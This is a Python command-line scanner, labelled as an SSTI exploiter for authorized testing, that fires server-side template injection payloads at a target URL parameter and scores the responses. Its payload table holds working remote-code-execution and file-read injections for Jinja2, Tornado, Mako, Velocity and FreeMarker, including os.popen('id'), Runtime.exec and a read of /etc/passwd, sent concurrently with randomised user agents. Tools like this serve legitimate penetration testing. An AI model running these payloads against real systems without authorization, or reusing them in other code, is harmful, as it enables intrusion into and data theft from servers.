#!/usr/bin/env python3
import argparse
import csv
import json
import time
import hashlib
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

import requests
from tqdm import tqdm

# a tuple of generic strings and injections that range from safe ones to test if it works, dangerous ones to attain info, and timing to test the delay loop
ENGINES = {
    "jinja2": {
        "safe": [
            "{{7*7}}",
            "{{ config.items() }}",
        ],
        "dangerous": [
            "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
            "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
        ],
        "timing": [
            # busy loop – harmless but can induce delay
            "{% for i in range(10**7) %}{% endfor %}"
        ],
        "errors": ["jinja2.exceptions", "UndefinedError", "TemplateSyntaxError"],
    },
    "tornado": {
        "safe": [
            "{{7*7}}",
        ],
        "dangerous": [
            "{{ __import__('os').popen('id').read() }}",
        ],
        "timing": [],
        "errors": ["tornado.template.ParseError", "tornado.web.HTTPServerRequest"],
    },
    "mako": {
        "safe": [
            "${7*7}",
        ],
        "dangerous": [
            "${__import__('os').popen('id').read()}",
        ],
        "timing": [],
        "errors": ["MakoRenderingException", "mako.exceptions"],
    },
    "velocity": {
        "safe": [
            "${7*7}",
        ],
        "dangerous": [
            "#set($x='')${x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}",
        ],
        "timing": [],
        "errors": ["org.apache.velocity", "VelocityException"],
    },
    "freemarker": {
        "safe": [
            "${7*7}",
        ],
        "dangerous": [
            "${\"freemarker.template.utility.Execute\"?new()('id')}",
        ],
        "timing": [],
        "errors": ["freemarker.core", "InvalidReferenceException"],
    },
    "jsp_el": {
        "safe": [
            "<%=7*7%>",
            "${7*7}",
        ],
        "dangerous": [
            "${pageContext.request.class.protectionDomain.codeSource.location}",
        ],
        "timing": [],
        "errors": ["javax.servlet", "JSPException", "org.apache.jasper"],
    },
    # heuristic hints for thymeleaf/twig 
    "thymeleaf": {
        "safe": ["${7*7}"],
        "dangerous": [],
        "timing": [],
        "errors": ["org.thymeleaf", "TemplateInputException"],
    },
    "twig": {
        "safe": ["{{7*7}}"],
        "dangerous": [],
        "timing": [],
        "errors": ["Twig_Error", "Twig\\Error"],
    },
}

# generic evidence markers
EVIDENCE_STRINGS = [
    "49", "uid=", "root:x:", "passwd", "flask", "jinja", "Traceback", "os.popen",
    "org.apache", "freemarker", "mako", "tornado", "thymeleaf", "twig"
]

# list of common default user agents for random requests
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "curl/7.87.0", "Wget/1.21.3", "python-requests/2.31"
]

# function that generates unique random alphanumeric string for request identification
def random_token(n=6) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

# function that takes payloads and returns it raw, encoded, and double encoded
def build_variants(payload: str):
    enc = quote(payload, safe="")
    enc2 = quote(enc, safe="")
    return [payload, enc, enc2]

# function that injects a given value into a param to create a url with a payload
def inject_into_url(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    qs[param] = value
    new_qs = urlencode(qs, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_qs, ''))

# function that sends http requests depending on method
def make_request(session, method, url, param, value, json_key=None, json_base=None,
                 headers=None, timeout=10, allow_redirects=False):
    headers = headers or {}
    if method == "GET":
        target = inject_into_url(url, param, value)
        return session.get(target, headers=headers, timeout=timeout, allow_redirects=allow_redirects), target
    elif method == "POST":
        data = {param: value}
        return session.post(url, data=data, headers=headers, timeout=timeout, allow_redirects=allow_redirects), url
    else:  
        if json_base:
            try:
                body = json.loads(json_base)
            except Exception:
                body = {}
        else:
            body = {}
        if json_key:
            body[json_key] = value
        else:
            body[param] = value
        return session.post(url, json=body, headers=headers, timeout=timeout, allow_redirects=allow_redirects), url

# computes sha256 hash of a response text, to track any changes in the response text
def hashish(text: str) -> str:
    return hashlib.sha256((text or "").encode("utf-8", errors="ignore")).hexdigest()

# function that analyzes if the payload is successful by seeing the results of numerous parameters
def analyze_response(resp_text: str, status: int, elapsed: float,
                     baseline, engine, used_payload, evid_extra=None):
    reasons = []
    evidence = []
    score = 0
    changed = False

    # baseline deltas
    if baseline:
        if status != baseline["status"]:
            reasons.append(f"status_change:{baseline['status']}→{status}")
            score += 10
            changed = True
        if abs(len(resp_text) - baseline["length"]) > 10:  
            reasons.append("length_diff")
            score += 10
            changed = True

    # evidence strings
    for m in (evid_extra or []):
        if m and m in resp_text:
            evidence.append(m)
    for m in EVIDENCE_STRINGS:
        if m in resp_text:
            evidence.append(m)

    # arithmetic eval result
    if "7*7" in used_payload.replace(" ", "") and "49" in resp_text:
        reasons.append("arithmetic_eval")
        score += 35

    # dangerous indicators
    if "uid=" in resp_text or "root:x:" in resp_text:
        reasons.append("code_exec_or_file_read")
        score += 45

    # engine error banners
    for marker in ENGINES.get(engine, {}).get("errors", []):
        if marker in resp_text:
            reasons.append(f"{engine}_error")
            score += 25

    engine_guess = engine if (score >= 25 or evidence) else None

    return {
        "score": score,
        "reasons": reasons,
        "evidence": list(sorted(set(evidence)))[:10],
        "engine_guess": engine_guess,
        "changed": changed
    }

# function that does the main scanning, uses thread workers to concurrently automate the use of previous functions to test for ssti and return the results through response parsing
def ssti_fuzz(url, param, method, json_key, json_base, headers, timeout, follow,
              threads, delay, dangerous, engines, save_snippet_len):
    results = []
    findings = []
    plan = []
    for eng in engines:
        fam = ENGINES[eng]
        probes = list(fam["safe"])
        if dangerous:
            probes += fam["dangerous"]
        probes += fam["timing"]

        for p in probes:
            for v in build_variants(p):
                plan.append((eng, p, v))

    with requests.Session() as s:
        s.headers.update(headers or {})
        t0 = time.time()
        base_resp, base_target = make_request(
            s, method, url, param, "SSTI_TEST", json_key, json_base,
            headers=headers, timeout=timeout, allow_redirects=follow
        )
        base_elapsed = time.time() - t0
        baseline = {
            "status": base_resp.status_code if base_resp is not None else 0,
            "length": len(base_resp.text) if base_resp is not None else 0,
            "hash": hashish(base_resp.text if base_resp is not None else ""),
            "elapsed": base_elapsed
        }

        def worker(item):
            eng, raw_payload, variant = item
            if delay > 0:
                time.sleep(delay)
            t1 = time.time()
            try:
                resp, target = make_request(
                    s, method, url, param, variant, json_key, json_base,
                    headers=headers, timeout=timeout, allow_redirects=follow
                )
                elapsed = time.time() - t1
                text = resp.text or ""
                analysis = analyze_response(text, resp.status_code, elapsed, baseline, eng, raw_payload)
                if raw_payload in ENGINES[eng]["timing"] and elapsed > max(baseline["elapsed"] * 3, baseline["elapsed"] + 1.0):
                    analysis["reasons"].append("timing_delay")
                    analysis["score"] += 20
                rec = {
                    "engine": eng,
                    "payload_raw": raw_payload,
                    "payload_variant": variant,
                    "target": target,
                    "status": resp.status_code,
                    "length": len(text),
                    "elapsed": round(elapsed, 3),
                    "score": analysis["score"],
                    "reasons": analysis["reasons"],
                    "evidence": analysis["evidence"],
                    "engine_guess": analysis["engine_guess"],
                }
                if save_snippet_len > 0:
                    rec["snippet"] = text[:save_snippet_len].replace("\n", " ")
                return rec
            except Exception as e:
                return {
                    "engine": eng,
                    "payload_raw": raw_payload,
                    "payload_variant": variant,
                    "target": url,
                    "status": -1,
                    "length": 0,
                    "elapsed": round(time.time() - t1, 3),
                    "score": 0,
                    "reasons": [f"error:{str(e)[:80]}"],
                    "evidence": [],
                    "engine_guess": None,
                }

        with ThreadPoolExecutor(max_workers=threads) as pool:
            futures = [pool.submit(worker, it) for it in plan]
            for fut in tqdm(as_completed(futures), total=len(futures), desc="SSTI"):
                rec = fut.result()
                results.append(rec)

    for r in results:
        if r["score"] >= 30 or r["evidence"]:
            findings.append(r)

    findings.sort(key=lambda x: (x["score"], len(x["evidence"])), reverse=True)
    return results, findings

# functions that save the results into json or csv formats
def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)
    print(f"|+| JSON saved → {path}")

def save_csv(path, rows):
    if not rows:
        print("|*| No rows to save.")
        return
    keys = set()
    for r in rows:
        keys.update(r.keys())
    ordered = ["engine", "engine_guess", "payload_raw", "payload_variant", "target", "status", "length", "elapsed", "score", "reasons", "evidence", "snippet"]
    cols = [c for c in ordered if c in keys] + [k for k in keys if k not in ordered]
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=cols)
        w.writeheader()
        for r in rows:
            row = dict(r)
            for k in ("reasons", "evidence"):
                if k in row and isinstance(row[k], list):
                    row[k] = ";".join(map(str, row[k]))
            w.writerow(row)
    print(f"|+| CSV saved → {path}")

# arg parser for cli customizability
def cli():
    ap = argparse.ArgumentParser(description="Advanced SSTI Exploiter (authorized testing only)")
    ap.add_argument("url", help="Target URL")
    ap.add_argument("param", help="Parameter name to inject (for GET/POST/JSON)")
    ap.add_argument("--method", choices=["GET", "POST", "JSON"], default="GET", help="HTTP method (default GET)")
    ap.add_argument("--json-key", help="Key to set in JSON body (default: uses --param)")
    ap.add_argument("--json-base", help="Base JSON body string or @file.json (use {PARAM} optionally)")
    ap.add_argument("--engine", action="append", choices=list(ENGINES.keys()), help="Limit to specific engine(s)")
    ap.add_argument("--dangerous", action="store_true", help="Enable dangerous payloads (os.popen, file read)")
    ap.add_argument("--threads", type=int, default=20, help="Concurrency (default 20)")
    ap.add_argument("--delay", type=float, default=0.0, help="Delay per request in seconds (default 0)")
    ap.add_argument("--timeout", type=int, default=10, help="HTTP timeout seconds (default 10)")
    ap.add_argument("--follow", action="store_true", help="Follow redirects")
    ap.add_argument("--header", action="append", default=[], help="Extra header 'Key: Value'")
    ap.add_argument("--cookie", help="Cookie header")
    ap.add_argument("--proxy", help="HTTP proxy (http://127.0.0.1:8080)")
    ap.add_argument("--ua", help="User-Agent override")
    ap.add_argument("--save-json", help="Write all results to JSON")
    ap.add_argument("--save-csv", help="Write findings to CSV")
    ap.add_argument("--save-snippet", type=int, default=160, help="Save response snippet length (0 to disable)")
    args = ap.parse_args()

    engines = args.engine or list(ENGINES.keys())

    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    if args.cookie:
        headers["Cookie"] = args.cookie
    headers["User-Agent"] = args.ua or random.choice(DEFAULT_USER_AGENTS)

    if args.proxy:
        requests_proxies = {"http": args.proxy, "https": args.proxy}
        old_Session = requests.Session
        def proxied_session():
            s = old_Session()
            s.proxies.update(requests_proxies)
            return s
        requests.Session = proxied_session  

    json_base = None
    if args.method == "JSON":
        if args.json_base:
            if args.json_base.startswith("@"):
                with open(args.json_base[1:], "r", encoding="utf-8", errors="ignore") as f:
                    json_base = f.read()
            else:
                json_base = args.json_base

    print(f"|*| Testing param '{args.param}' on {args.url} with engines: {', '.join(engines)}")
    all_results, findings = ssti_fuzz(
        url=args.url,
        param=args.param,
        method=args.method,
        json_key=args.json_key,
        json_base=json_base,
        headers=headers,
        timeout=args.timeout,
        follow=args.follow,
        threads=args.threads,
        delay=args.delay,
        dangerous=args.dangerous,
        engines=engines,
        save_snippet_len=args.save_snippet
    )

    if not findings:
        print("\n|-| No strong SSTI signals detected.")
    else:
        print(f"\n|+| Top findings (by score):")
        for r in findings[:10]:
            ev = f" | evidence={','.join(r['evidence'])}" if r.get("evidence") else ""
            print(f"  - {r['engine']:9s} | score={r['score']:2d} | {r['status']}/{r['length']} | t={r['elapsed']}s{ev}")
            print(f"    payload={r['payload_raw']!r}")

    if args.save_json:
        save_json(args.save_json, all_results)
    if args.save_csv:
        save_csv(args.save_csv, findings)

if __name__ == "__main__":
    cli()
